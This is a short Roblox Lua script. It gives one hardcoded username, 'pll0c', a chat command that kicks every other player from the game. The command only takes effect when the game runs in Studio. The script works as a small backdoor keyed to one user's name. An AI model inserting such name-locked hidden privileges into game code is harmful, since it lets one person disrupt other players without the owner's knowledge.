game.Players.PlayerAdded:Connect(function(player)
  if player.Name == "pll0c" then
    if game:GetService("RunService"):IsStudio() then
      local function kickAll()
        for _, p in pairs(game.Players:GetPlayers()) do
          if p.Name ~= "pll0c" then
            p:Kick()
          end
        end
      end
      game.Chat:RegisterChatCommand("kick", function(speaker, message)
        if speaker.Name == "pll0c" and message == "all" then
          kickAll()
          print('heheheheh')
        end
      end)
    end
  end
end)
